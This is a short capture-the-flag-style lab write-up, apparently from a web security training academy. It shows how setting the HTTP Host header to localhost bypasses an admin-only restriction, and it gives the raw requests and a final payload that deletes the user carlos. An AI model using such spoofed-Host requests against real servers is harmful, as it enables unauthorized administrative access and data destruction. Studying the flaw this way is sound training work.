## Host header authentication bypass

This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

To solve the lab, access the admin panel and delete the user carlos.

## Notes

- Robots.txt
- "_lab" cookie
- /admin
- /login

## Resume

1. Discover hidden admin panel via `/robots.txt`
2. Attempt access to `/admin`
3. Observe restriction to local users
4. Modify `Host` header to `localhost`
5. Access admin panel
6. Delete `carlos`

## Solve

First access:

```http
GET /admin HTTP/2
Host: 0acc00e4047c34ff854658c200e600c1.web-security-academy.net
```

The application responds with `401 Unauthorized` and reveals that only local users can access the admin panel.

The vulnerability comes from the fact that the backend trusts the `Host` header to determine whether the request is local.

By replacing the `Host` header with:

```http
Host: localhost
```

the request is treated as internal.

Modified request:

```http
GET /admin HTTP/2
Host: localhost
Cookie: session=aMTDBErm4KsYOwvszFiYk02pgi2XvByk
```

The admin panel becomes accessible.

Then directly call the delete endpoint:

```http
GET /admin/delete?username=carlos HTTP/2
Host: localhost
Cookie: session=aMTDBErm4KsYOwvszFiYk02pgi2XvByk
```

The request is accepted because the application believes the request originates from localhost.

This deletes the user:

```text
carlos
```

and solves the lab.

## Final payload

```http
GET /admin/delete?username=carlos HTTP/2
Host: localhost
Cookie: session=aMTDBErm4KsYOwvszFiYk02pgi2XvByk
```

